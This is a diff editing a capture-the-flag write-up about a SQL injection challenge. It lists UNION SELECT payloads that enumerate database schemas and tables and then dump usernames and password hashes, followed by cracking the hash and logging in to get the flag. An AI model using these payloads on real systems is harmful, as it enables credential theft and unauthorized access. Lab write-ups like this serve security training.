@@ -1,16 +1,27 @@
-looking at all the columns of all the databases (1 UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns --) We knew a tab with username/password was existing
-let's look for it
+During our first sql injection, we took a good look at the database.
+By displaying all the possible columns of all the possible tables.
+We know that a table contains username / password:
 
+1 UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns --
+
+ID: 1 UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns -- 
+Title: 
+Url : username
+ID: 1 UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns -- 
+Title: 
+Url : password
+
+We need to find the name of this table, we display all the tables with:
 1 UNION SELECT SCHEMA_NAME,NULL FROM information_schema.schemata--
-To have all database name
 
+Then the name of each database with:
 1 UNION SELECT TABLE_NAME,NULL FROM information_schema.tables--
-To have all tables
 
+Now with several tests we understand that the password / username comes from the Member_Brute_Force:
 1  UNION SELECT password,username from Member_Brute_Force.db_default --
 
 We get the same password on two lines for root and admin: 3bf1114a986ba87ed28fc1b5884fc2f8
-
 puting it on a password cracker (crackstation.net) we get a password 'shadow'
 
-works with any username on the login page
+works with any username on the login page.
+We login and we have a flag.
